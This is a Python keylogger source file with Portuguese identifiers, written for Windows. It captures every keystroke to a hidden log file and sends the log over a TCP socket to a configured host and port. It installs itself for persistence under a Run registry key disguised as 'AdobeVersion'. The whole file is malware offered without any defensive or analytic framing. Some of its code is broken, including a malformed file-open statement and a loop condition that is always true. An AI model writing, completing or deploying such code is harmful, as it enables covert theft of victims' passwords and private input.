# -*- coding: utf-8 -*-
from pynput.keyboard import Listener
import socket
import os
import subprocess
import tempfile
import time
import re


def log_keystroke(key):
    key = str(key)

    key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.*', '', key)

    with open("C:\\Users\\Public\\Downloads\\mkw.txt", 'a') as f:
        f.write(key)

def iniciar_keylog():
    tempo = time.localtime()
    while tempo.tm_hour != 18 or tempo.tm_hour != 13:
        with Listener(on_press=log_keystroke) as l:
            l.join()
    
    enviar_log()
    
FILENAME = 'mkw.exe'
TEMPDIR = tempfile.gettempdir()
DIRETORIO = os.path.dirname(os.path.abspath(__file__))
host = '127.0.0.1'
porta = 333
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def enviar_log():
    
    with open("C:\\Users\\Public\\Downloads\\mkw.txt"), "rb" as f:
        file_data = f.read(1024)
        while file_data:
            sock.connect((host, porta))
            sock.send("[+] Enviando log...")
            time.sleep(3)
            sock.send(file_data)
            file_data = f.read(1024)

        time.sleep(1)
        sock.close()
        iniciar_keylog()

def autorun():
    try:
        os.system("copy " + FILENAME + " " + TEMPDIR)
    except:
        pass

    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v AdobeVersion /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
    except:
        pass

if __name__ == '__main__':
    if DIRETORIO.lower() != TEMPDIR.lower():  
        try:
            autorun()
        except:
            pass
        
    iniciar_keylog()
